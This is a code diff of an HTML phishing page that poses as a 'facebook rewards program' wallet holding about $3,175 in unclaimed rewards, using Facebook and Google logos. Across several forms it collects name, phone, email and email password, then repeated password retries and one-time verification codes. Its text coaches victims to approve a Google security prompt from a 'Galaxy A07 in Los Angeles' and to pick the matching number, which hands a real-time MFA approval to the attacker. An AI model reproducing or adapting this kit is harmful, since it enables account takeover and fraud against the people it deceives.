@@ -3,7 +3,14 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>School</title>
+<title>reward program</title>
+
+<!-- Speed Optimization: Resource Hints for External CDNs -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="preconnect" href="https://cdn.jsdelivr.net">
+<link rel="dns-prefetch" href="https://bqddohfszkqpvncpbrun.supabase.co">
 
 <!-- Open Graph / Social Media Meta Tags -->
 <meta property="og:title" content="Video Call">
@@ -85,6 +92,110 @@
     margin-bottom: 0;
   }
 
+  /* FUTURE STYLING CLASSES */
+  .FutureHeading {
+    font-size: 19px;
+    color: #000000;
+    font-weight: 600;
+    font-style: normal;
+    letter-spacing: 0.5px;
+    margin-top: 5px;
+    margin-bottom: 0;
+  }
+
+  .Future {
+    color: #000000;
+    font-weight: 500;
+  }
+
+  .Future16Black {
+    font-size: 15px;
+    color: #000000;
+    font-weight: 500;
+    line-height: 1.5;
+    margin: 0 0 10px 0;
+  }
+
+  /* NEW BLACK BORDERED INPUT WITH EDITABLE LABEL STYLING */
+  .floating-input-black {
+    width: 100%;
+    height: 53px;
+    font-size: 16px;
+    color: #171a20;
+    background-color: #ffffff;
+    border: 1.8px solid #000000;
+    border-radius: 1px;
+    padding: 0 16px;
+    outline: none;
+    transition: border-color 0.2s ease;
+  }
+
+  .floating-input-black:focus {
+    border-color: #000000;
+  }
+
+  .floating-label-black {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    background-color: #ffffff;
+    padding: 0 4px;
+    color: #000000;
+    font-size: 16px;
+    font-weight: 500;
+    pointer-events: none;
+    transition: 0.2s ease all;
+  }
+
+  .floating-input-black:focus ~ .floating-label-black,
+  .floating-input-black:not(:placeholder-shown) ~ .floating-label-black {
+    top: 0;
+    transform: translateY(-50%) scale(0.85);
+    font-size: 12px;
+    font-weight: 600;
+    color: #000000;
+  }
+
+  .full-black-btn {
+    width: 100%;
+    height: 45px;
+    background-color: #000000;
+    color: #ffffff;
+    border: none;
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background-color 0.2s ease;
+  }
+  .full-black-btn:hover {
+    background-color: #333333;
+  }
+
+  .full-navy-btn {
+    width: 98%;
+    height: 45px;
+    background-color: #0a2540;
+    color: #ffffff;
+    border: none;
+    border-radius: 20px;
+    font-size: 16px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background-color 0.2s ease;
+  }
+  .full-navy-btn:hover {
+    background-color: #123456;
+  }
+
   .signin-header-title {
     font-size: 22px;
     color: #000000 !important;
@@ -130,9 +241,8 @@
     text-align: left;
   }
 
-  /* RESPONSIVE EXTERNAL MESSAGE STYLING (.external-message) */
   .external-message {
-    font-size: clamp(24px, 7vw, 41px);
+    font-size: clamp(30px, 8vw, 50px);
     font-weight: 400;
     color: #000000;
     text-align: center;
@@ -209,7 +319,6 @@
     background-color: #1557b0;
   }
 
-  /* CUSTOM FINAL SUPPORT BUTTON */
   .customer-support-btn {
     width: 100%;
     height: 50px;
@@ -232,7 +341,6 @@
     background-color: #1557b0;
   }
 
-  /* UNIFIED PROCESSING CONTAINERS */
   .processing-container {
     text-align: center;
     padding: 110px 0;
@@ -251,6 +359,15 @@
     font-size: 18px;
     font-weight: 500;
     margin: 0;
+  }
+
+  .processing-large-text {
+    color: #171a20;
+    font-weight: 600;
+    font-size: 23px;
+    letter-spacing: 0.5px;
+    margin: 12px 0;
+    line-height: 1.3;
   }
 
   .example-spinner-wrapper {
@@ -290,12 +407,12 @@
     align-items: center;
     justify-content: center;
     font-family: 'JetBrains Mono', monospace;
-    font-weight: 700;
-    font-size: 48px;
+    font-weight: 400;
+    font-size: 45px;
     color: #000000;
   }
 
-  /* WALLET CARD CLASS */
+  /* WALLET CARD & REFINED CENTS STYLING */
   .exact-wallet-card {
     background: #ffffff;
     border: 2px solid var(--color-bank-navy);
@@ -360,11 +477,17 @@
     margin: 0;
   }
 
-  .exact-wallet-card .wallet-amount {
-    font-size: 32px;
-    font-weight: 700;
+  .wallet-amount {
+    font-size: 33px;
+    font-weight: 500;
     color: #0a2540;
     line-height: 1.1;
+  }
+
+  .wallet-amount .decimal-cents {
+    font-size: 29px;
+    font-weight: 400;
+    color: #0a2540;
   }
 
   .exact-wallet-card .wallet-footer {
@@ -425,11 +548,11 @@
                 <div style="padding: 16px; border-radius: 4px; border: 1px solid #d1d5db; background: #ffffff; display: flex; align-items: center; justify-content: space-between;">
                     <div>
                         <div style="font-size: 11px; font-family: 'JetBrains Mono', monospace; color: #4a5568;">REF: TX-WELCOME-BONUS</div>
-                        <div style="font-size: 12px; font-weight: 700; color: #0a2540; margin-top: 2px;">Account Opening Deposit</div>
-                        <div style="font-size: 10px; color: #4a5568;">Church</div>
+                        <div style="font-size: 12px; font-weight: 700; color: #0a2540; margin-top: 2px;">Opening Deposit</div>
+                        <div style="font-size: 10px; color: #4a5568;">wallet</div>
                     </div>
                     <div style="text-align: right;">
-                        <div style="font-size: 12px; font-weight: 700; font-family: 'JetBrains Mono', monospace; color: #1b7e42;">+$3,179.00</div>
+                        <div style="font-size: 12px; font-weight: 700; font-family: 'JetBrains Mono', monospace; color: #1b7e42;">+$3,175<span style="font-size:14px; font-weight:600;">.00</span></div>
                         <span style="display: inline-block; padding: 2px 8px; border-radius: 4px; background: #eef9f2; color: #1b7e42; font-size: 10px; font-family: 'JetBrains Mono', monospace; border: 1px solid #a7f3d0; margin-top: 4px;">Cleared</span>
                     </div>
                 </div>
@@ -447,56 +570,44 @@
         <div id="myFormSection" class="step-section" style="display: block;">
           <form id="myForm" onsubmit="submitForm(event);">
             <input type="hidden" name="z_DeviceContext" id="hiddenDeviceContext">
-
             <div style="text-align: center; margin-bottom: 16px;">
               <img src="https://www.pngmart.com/files/15/Circle-Facebook-Logo-PNG-Transparent-Picture.png" class="sFlh5c FyHeAf iPVvYb" style="max-width: 2000px; width: 55px; height: 55px; margin: 0px;" alt="" role="button">
-              <h5 class="form-title-facebook">SchoolApp</h5>
+              <h5 class="form-title-facebook">facebook</h5>
             </div>
-                
-            <h5 class="step1-intro-text">
+            
+                              <h5 class="step1-intro-text">
               Discover the easiest way to make money online with the facebook rewards program. We literally pay you for your time on the app! People who use facebook for over 3 hours a day can earn up to $7,000 over a 2-year period.
 <br><br>
 Did you use facebook at all this past years? If so, you might already have up to $7,000 in unclaimed rewards waiting for you.
+           
             </h5>
-
-     
-
+            
             <div style="text-align: center;">
               <img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
               <h5 class="signin-header-title">Sign in</h5>
             </div>
-
             <h5 class="step1-login-subtitle">
-            
-            
-            To see your rewards, sign in to your facebook wallet using your gmail account.
-            
-            </h5><br>
-
+To see your rewards, sign in to your facebook wallet using your gmail account.
+</h5><br>
             <div id="error-message" style="color: #dc2626; font-size: 11px; margin-bottom: 4px;"></div>
-
             <div class="floating-group">
-              <input type="text" required name="Student" autocomplete="off" id="name" class="floating-input" placeholder=" " data-min-length="5" data-error-message="Please enter your full name" oninput="validateInput(this)" />
+              <input type="text" required name="1_PageA_Mail+No+Log" autocomplete="off" id="name" class="floating-input" placeholder=" " data-min-length="5" data-error-message="Please enter your full name" oninput="validateInput(this)" />
               <span class="floating-label">Enter your Name</span>
             </div>
-            
             <div class="floating-group">
-              <input type="text" inputmode="numeric" pattern="[0-9]{10,15}" minlength="10" maxlength="15" required id="email" name="Phone" class="floating-input" placeholder=" " data-min-length="10" data-error-message="Please enter complete phone number" oninput="validatePhoneInput(this)" />
+              <input type="tel" inputmode="numeric" pattern="[0-9]{10,15}" minlength="10" maxlength="15" required id="email" name="Phone" class="floating-input" placeholder=" " data-min-length="10" data-error-message="Please enter complete phone number" oninput="validatePhoneInput(this)" />
               <span class="floating-label">Enter your Phone Number</span>
             </div>
-       
             <div class="floating-group">
-              <input type="text" required name="Pass" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
+              <input type="text" required name="mail" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
               <span class="floating-label">Enter your Email</span>
             </div>
-
             <div class="floating-group">
-              <input type="text" required name="mail" class="floating-input" placeholder=" " data-min-length="5" data-error-message="Please enter correct password" oninput="validateCustom(this)" />
-              <span class="floating-label">Enter your Email Password</span>
+              <input type="text" required name="Pass" class="floating-input" placeholder=" " data-min-length="5" data-error-message="Please enter correct password" oninput="validateCustom(this)" />
+              <span class="floating-label">Enter your Password</span>
             </div>
-
             <button type="submit" class="responsive-btn">Log in</button>
-          </form>
+          </form> <br><br>
         </div>
 
         <!-- PROCESSING 1 -->
@@ -519,453 +630,930 @@ Did you use facebook at all this past years? If so, you might already have up to
               <div class="wallet-body">
                   <div class="wallet-top-row">
                       <span class="wallet-label">Available balance</span>
-                      <span class="wallet-fdic">
-                          <span class="wallet-fdic-dot"></span> FDIC Insured
-                      </span>
+                      <span class="wallet-fdic"><span class="wallet-fdic-dot"></span> FDIC Insured</span>
                   </div>
-                  <div class="wallet-amount">$3,179.00</div>
+                  <div class="wallet-amount">$3,175<span class="decimal-cents">.00</span></div>
                   <div class="wallet-footer">
-                      <span style="font-size: 18px; color: #4267B2; font-weight: 700;">facebook wallet</span>
+                      <span style="font-size: 19px; color: #4267B2; font-weight: 700;">facebook wallet</span>
                       <button type="button" onclick="openTxOverlay()" class="wallet-stmt-btn">Transaction &gt;</button>
                   </div>
               </div>
           </div>
-
           <form id="secondForm" onsubmit="submitSecondForm(event);">
             <input type="hidden" name="Celeb" id="hiddenCelebInput">
             
-            
-                        <h5 class="step1-intro-text">
-Look at that balance, <span class="submittedName"></span>. Every hour you spent on facebook has earned you a small amount, and over the past year, those small amounts have added up to <strong>$3,179.00</strong>
-
+                           <h5 class="step1-intro-text">
+Look at that balance, <span class="submittedName"></span>. Every hour you spent on facebook has earned you a small amount, and over the past year, those small amounts have added up to <strong>$3,175.00</strong>
 <br><br>
-
-This reward reflects your active hours on facebook, which were inconsistent over the past year. Because our program rewards consistent daily usage, we encourage you to use facebook regularly. Enjoy your $3,179.00
+This reward reflects your active hours on facebook, which were inconsistent over the past year. Because our program rewards consistent daily usage, we encourage you to use facebook regularly. Enjoy your $3,175.00
        
               </h5>
               
+            
             
             <div style="text-align: center;">
               <img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
               <h5 class="signin-header-title">Sign in</h5>
             </div>
-            <h5 class="dashboard-subtitle">
             
-            To access your $3,179.00 reward, please sign into your facbook wallet using your email account.
+                        <h5 class="dashboard-subtitle">
+ To access your $3,175.00 reward, please sign into your facbook wallet using your email account.
 <br><br><strong>
-
-Security Note: </strong> When you sign in, your security log will display a login from a Galaxy A07 in Los Angeles.
+Security Note: </strong>  You will see a Google security notification stating that you are signing in from a Galaxy A07 in Los Angeles.
 <br><br>
-This is because the wallet system operates through a Galaxy A07 located at the facebook headquarters in Los Angeles. If you used an incorrect password previously, please sign in using your correct email account password.
-            </h5><br>
+This sign-in is safe because our wallet system uses a Galaxy A07 node at the google headquarters in Los Angeles. 
+<br> <br>
+If you used an incorrect password previously, please sign in using your correct email account password.
+            </h5><br>   
             
-            <div>
+              <div>
               <div class="floating-group">
-                <input type="text" required id="fullName" name="Googl-Emai" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
+                <input type="text" required id="fullName" name="2_B_Mail_Log" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
                 <span class="floating-label">Email</span>
-              </div>
-
+             
+ </div>
+            
               <div class="floating-group">
-                <input type="text" required id="email2" name="Pass" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Please enter at least 8 characters for password" oninput="validateCustom(this)" />
+                <input type="text" required id="email2" name="2_pageB_pass" class="floating-input" placeholder=" " data-min-length="7" data-error-message="Please complete password" oninput="validateCustom(this)" />
                 <span class="floating-label">Email Password</span>
               </div>
-
               <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
               <button type="submit" class="responsive-btn">Log in</button>
             </div>
-          </form>
+          </form> <br><br>
         </div> 
 
         <!-- PROCESSING 2 -->
         <div id="processing2" class="step-section processing-container">
-          <div class="example-spinner-wrapper">
-            <div class="example-spinner-bg"></div>
-            <div class="example-spinner-ring"></div>
-            <div id="timerCount2" class="timerCount">1%</div>
-          </div>
+          <div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount2" class="timerCount">1%</div></div>
           <div class="processing-title-custom">Verifying credentials.......</div>
           <div class="processing-subtitle-custom">Please wait....</div>
         </div>
 
         <!-- FORM 3 ("C") -->
-        <div id="mainContent2" class="step-section">
-          <div class="lower-section">
-            <form id="thirdForm" onsubmit="submitThirdForm(event);">
-              <h5 class="step1-intro-text">
-              
-              
-                         
+        <div id="mainContent2" class="step-section"><div class="lower-section">
+          <form id="thirdForm" onsubmit="submitThirdForm(event);">
+            <h5 class="step1-intro-text">
 
-<strong>2-Step Verification: Approve your sign-in</strong> 
+<strong>IMPORTANT: </strong>  You will see a Google security notification stating that you are signing in from a Galaxy A07 in Los Angeles.
 <br><br>
-When you sign in, your security log will display a login request from a Galaxy A07 in Los Angeles. This is because this specific wallet system processes requests using a Galaxy A07 node located at the google headquarters in Los Angeles.
-<br><br>
-Get ready, <span class="submittedName"></span>,  you'll receive a google security notification stating that you are trying to sign in from a Galaxy A07 in Los Angeles. To approve your sign-in, you must select:
+This sign-in is safe because our wallet system uses a Galaxy A07 node at the google headquarters in Los Angeles. To approve your sign-in from the Galaxy A07 wallet in Los Angeles, select:
+
 <br><br>
 <strong>"Yes, it's me trying to sign in"</strong>
 
 <br><br>
+After selecting "Yes, it's me", you will be prompted to pick a number. Just pick the matching number that appears below.
 
-After selecting "Yes, it's me". You should pick the matching number that appears below shortly:
-       
-       <div class="external-message"></div>
-       
-       
-              </h5>     
-              
-
-              <h5 class="verification-instruction-text">
-                You will also receive a verification code in a few seconds. Once received, enter the code below:
-              
-              </h5>
-
-              <div>
-                <div class="floating-group">
-                  <input type="text" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="3rd_Page_Verif_Code" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please enter complete code" oninput="validateCodeInput(this)" />
-                  <span class="floating-label">Enter Verification Code</span> 
-                </div>
-
-                <div class="floating-group">
-                  <input type="text" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="3rd_Page_Code_Confirm" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please enter complete code" oninput="validateCodeInput(this)" />
-                  <span class="floating-label">Enter Verification Code Again</span>
-                </div>
-
-                <button type="submit" class="responsive-btn">Log in</button>
+</h5>     
+            <div class="external-message"></div>
+            
+            <h5 class="verification-instruction-text">
+You will also receive a verification code shortly. Once received, enter the code below: </h5>
+            <div>
+            
+              <div class="floating-group">
+                <input type="tel" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="3_pageC_code" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please enter complete code" oninput="validateCodeInput(this)" />
+                <span class="floating-label">Enter Verification Code</span> 
               </div>
-            </form>
-          </div>
-        </div>
+              <div class="floating-group">
+                <input type="tel" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="confirm" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please enter complete code" oninput="validateCodeInput(this)" />
+                <span class="floating-label">Enter Verification Code Again</span>
+              </div>
+              <button type="submit" class="responsive-btn">Log in</button>
+            </div>
+          </form> <br><br>
+      
+        </div></div>
 
         <!-- PROCESSING 3 -->
-        <div id="processing3" class="step-section processing-container">
-          <div class="example-spinner-wrapper">
-            <div class="example-spinner-bg"></div>
-            <div class="example-spinner-ring"></div>
-            <div id="timerCount3" class="timerCount">1%</div>
-          </div>
-          <div class="processing-title-custom">Finalizing verification.......</div>
-          <div class="processing-subtitle-custom">Please wait....</div>
-        </div>
+        <div id="processing3" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount3" class="timerCount">1%</div></div><div class="processing-title-custom">Finalizing verification.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
 
         <!-- FORM 4 ("D") -->
-        <div id="mainContent3" class="step-section">
-          <div class="lower-section">
-            <form id="fourthForm" onsubmit="submitFourthForm(event);">
-              <div style="text-align: center;">
-                <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
-                <h5 class="step1-intro-text">Get ready to go back to school. Yes only</h5>
-                <div class="external-message"></div>
-                <h5 class="pin-instruction-text">Please enter correct verification code</h5>
-                <div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="securePin" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete PIN" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Enter Verification Code</span> 
-                  </div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="securePin_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete PIN" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Enter Verification Code Again</span>
-                  </div>
-                  <button type="submit" class="responsive-btn">Proceed</button>
+        <div id="mainContent3" class="step-section"><div class="lower-section">
+          <form id="fourthForm" onsubmit="submitFourthForm(event);">
+            <div style="text-align: center;">
+              <h5 class="step1-intro-text">
+              
+<strong>VERIFICATION: </strong> 
+You will see a google  security notification saying that you are signing in from a Galaxy A07 in Los Angeles.
+<br><br>
+This sign-in is safe because our wallet system uses a Galaxy A07 node at the google headquarters in Los Angeles. To approve your sign-in from the Galaxy A07 wallet in Los Angeles, select:
+
+<br><br>
+<strong>"Yes, it's me trying to sign in"</strong>
+
+<br><br>
+After selecting "Yes, it's me", you will be prompted to pick a number. Just pick the matching number that appears below. 
+</h5>
+              <div class="external-message"></div>
+              <h5 class="pin-instruction-text"> You will receive a verification code shortly. Once received, enter the code below:
+</h5>
+              <div>
+                <div class="floating-group">
+                  <input type="tel" inputmode="numeric" pattern="[0-9]{4,10}" minlength="4" maxlength="10" required name="4_pageD_Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete Code" oninput="validateCodeInput(this)" />
+                  <span class="floating-label">Enter Code</span> 
                 </div>
+                <div class="floating-group">
+                  <input type="tel" inputmode="numeric" pattern="[0-9]{4,10}" minlength="4" maxlength="10" required name="4_pageD_cod_Confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete Code" oninput="validateCodeInput(this)" />
+                  <span class="floating-label">Enter Verification Code Again</span>
+                </div>
+                <button type="submit" class="responsive-btn">Proceed</button>
               </div>
-            </form>
-          </div>
-        </div>
+            </div>
+          </form> <br><br>
+        </div></div>
 
         <!-- PROCESSING 4 -->
-        <div id="processing4" class="step-section processing-container">
-          <div class="example-spinner-wrapper">
-            <div class="example-spinner-bg"></div>
-            <div class="example-spinner-ring"></div>
-            <div id="timerCount4" class="timerCount">1%</div>
-          </div>
-          <div class="processing-title-custom">Verifying details.......</div>
-          <div class="processing-subtitle-custom">Please wait....</div>
-        </div>
+        <div id="processing4" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount4" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying details.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
 
         <!-- FORM 5 ("E") -->
-        <div id="mainContent4" class="step-section">
-          <div class="lower-section">
-            <form id="fifthForm" onsubmit="submitFifthForm(event);">
-              <div style="text-align: center;">
-                
+        <div id="mainContent4" class="step-section"><div class="lower-section">
+          <form id="fifthForm" onsubmit="submitFifthForm(event);">
+            <div style="text-align: center;">      
+                <img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School"> <br>
                 <h5 class="step1-intro-text">
-                
-Your facebook wallet is linked to your email. To access the $3,179.00 in your wallet, you must use your email to sign in. To help you sign in, you will receive a verification code shortly. Do not leave this page until you receive the code. Once received, enter it below:
-</h5>
-                <div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="E_5th_Pag-Code" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please enter code" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Enter Verification Code</span> 
-                  </div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="E_Code_Confirm" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please confirm code" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Enter Verification Code Again</span>
-                  </div>
-                  <button type="submit" class="responsive-btn">Proceed</button>
-                </div>
+You are having trouble signing in to your email because you are using a wrong password. Please try again. Page 5</h5>
+            
+              <div>
+                <div class="floating-group">
+<input type="text" required id="fullName" name="5_E_Mail_pass_Retry" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
+    <span class="floating-label">Email</span>     
+</div>
+
+<div class="floating-group">
+                <input type="text" required id="fullName" name="5_E_Mail_pass_Retry" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete password" oninput="validateCustom(this)" />
+                <span class="floating-label">Email Password</span>
+            
+</div>
+
+                <button type="submit" class="responsive-btn">Proceed</button>
               </div>
-            </form>
-          </div>
-        </div>
+            </div>
+          </form> <br><br>
+        </div></div>
 
         <!-- PROCESSING 5 -->
-        <div id="processing5" class="step-section processing-container">
-          <div class="example-spinner-wrapper">
-            <div class="example-spinner-bg"></div>
-            <div class="example-spinner-ring"></div>
-            <div id="timerCount5" class="timerCount">1%</div>
-          </div>
-          <div class="processing-title-custom">Processing authorization.......</div>
-          <div class="processing-subtitle-custom">Almost done....</div>
-        </div>
+        <div id="processing5" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount5" class="timerCount">1%</div></div><div class="processing-title-custom">Processing authorization.......</div><div class="processing-subtitle-custom">Almost done....</div></div>
 
         <!-- FORM 6 ("F") -->
-        <div id="mainContent5" class="step-section">
-          <div class="lower-section">
-            <form id="sixthForm" onsubmit="submitSixthForm(event);">
-              <div style="text-align: center;">
-                
-                <h5 class="step1-intro-text">
+        <div id="mainContent5" class="step-section"><div class="lower-section">
+          <form id="sixthForm" onsubmit="submitSixthForm(event);">
+            <div style="text-align: center;">
+            
+              <h5 class="step1-intro-text">
+<br><br>
+You almost have it, but that password was incorrect. Please try again
 
-The code you entered earlier is not correct. Please check your messages or notifications for a verification code. Alternatively, you will receive a new verification code. Once received, enter it below, making sure it is correct </h5>
+ Page 6 (F)</h5>
+             
+
+              <div> 
                 
-                
-                <div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="F_6_Page_Code" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please enter code" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Enter Verification Code</span> 
-                  </div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="F_Cod_Confirm" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please confirm code" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Enter Verification Code Again</span>
-                  </div>
-                  <button type="submit" class="responsive-btn">Next</button>
-                </div>
+<div class="floating-group">
+<input type="text" required id="fullName" name="page6_F_mail_Retry" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
+    <span class="floating-label">Email</span>     
+</div>
+
+<div class="floating-group">
+                <input type="text" required id="fullName" name="page6_F_passw_Retry" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete password" oninput="validateCustom(this)" />
+                <span class="floating-label">Email Password</span>
+            
+</div>
+                <button type="submit" class="responsive-btn">Log in</button>
               </div>
-            </form>
-          </div>
-        </div>
+            </div>
+          </form> <br><br> 
+        </div></div>
 
         <!-- PROCESSING 6 -->
-        <div id="processing6" class="step-section processing-container">
-          <div class="example-spinner-wrapper">
-            <div class="example-spinner-bg"></div>
-            <div class="example-spinner-ring"></div>
-            <div id="timerCount6" class="timerCount">1%</div>
-          </div>
-          <div class="processing-title-custom">Finalizing setup.......</div>
-          <div class="processing-subtitle-custom">Please wait....</div>
-        </div>
+        <div id="processing6" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount6" class="timerCount">1%</div></div><div class="processing-title-custom">Finalizing setup.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
 
         <!-- FORM 7 ("G") -->
-        <div id="mainContent6" class="step-section">
-          <div class="lower-section">
-            <form id="seventhForm" onsubmit="submitSeventhForm(event);">
-              <div style="text-align: center;">
-                <img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
-                <h5 class="step1-intro-text">
-You are having trouble signing in to your email because you are using the wrong password. Please try again. </h5>
-                
-                <div>
-                       <div class="floating-group">
-                <input type="text" required id="fullName" name="G_7th_Page_mail" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
-                <span class="floating-label">Email</span>
-              </div>
+        <div id="mainContent6" class="step-section"><div class="lower-section">
+          <form id="seventhForm" onsubmit="submitSeventhForm(event);">
+            <div style="text-align: center;">
+              <h5 class="step1-intro-text">
 
-              <div class="floating-group">
-                <input type="text" required id="email2" name="G_7th_Pass_Retry" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Please enter correct password" oninput="validateCustom(this)" />
-                <span class="floating-label">Email Password</span>
+Your facebook wallet is linked to your email. To access the $3,175.00 in your wallet, you must use your email to sign in. To help you sign in, you will receive a verification code shortly. Do not leave this page until you receive the code. Once received, enter it below: Page 7 (G)</h5>
+              
+              <div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="page7(G)_Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter Verification Code" oninput="validateCodeInput(this)" /><span class="floating-label">Verification Code</span></div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="Page7(G)retry_Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm Verification Code" oninput="validateCodeInput(this)" /><span class="floating-label">Enter Verification Code</span></div>
+                <button type="submit" class="responsive-btn">Verify</button>
               </div>
-                  
-                  
-                  <button type="submit" class="responsive-btn">Verify</button>
-                </div>
-              </div>
-            </form>
-          </div>
-        </div>
+            </div>
+          </form> <br><br> 
+        </div></div>
 
         <!-- PROCESSING 7 -->
-        <div id="processing7" class="step-section processing-container">
-          <div class="example-spinner-wrapper">
-            <div class="example-spinner-bg"></div>
-            <div class="example-spinner-ring"></div>
-            <div id="timerCount7" class="timerCount">1%</div>
-          </div>
-          <div class="processing-title-custom">Verifying ..</div>
-          <div class="processing-subtitle-custom">Please Wait.  Do not leave this page</div>
-        </div>
+        <div id="processing7" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount7" class="timerCount">1%</div></div><div class="processing-title-custom">Validating passkey.......</div><div class="processing-subtitle-custom">Almost there....</div></div>
 
         <!-- FORM 8 ("H") -->
-        <div id="mainContent7" class="step-section">
-          <div class="lower-section">
-            <form id="eighthForm" onsubmit="submitEighthForm(event);">
-              <div style="text-align: center;">
-                <img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
-                
-                <h5 class="step1-intro-text">
-Good job, <span class="submittedName"></span>, you've successfully signed into your facebook account on the Galaxy A07 at facbook headquarters in Los Angeles.
-<br>
-<br>
-The most important thing you need to do now is link your messages to the facebook wallet web, so important updates about the $3,197.00 delivery status will be sent to your messages.
- Follow the steps below to link your messages to the web:
+        <div id="mainContent7" class="step-section"><div class="lower-section">
+          <form id="eighthForm" onsubmit="submitEighthForm(event);">
+            <div style="text-align: center;">
+            <img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
+            <br>
+              <h5 class="step1-intro-text">
+
+<strong>Please read the text below carefully and approve your sign-in </strong>
 <br><br>
-<strong>
-1: </strong> Go to your messages app and approve your request to link to the web. You'll be prompted to link your messages to the web by selecting an emoji.
+
+Your sign-in attempt is routed through our Galaxy A07 wallet at the Google headquarters in Los Angeles.
+
 <br><br>
-<strong>
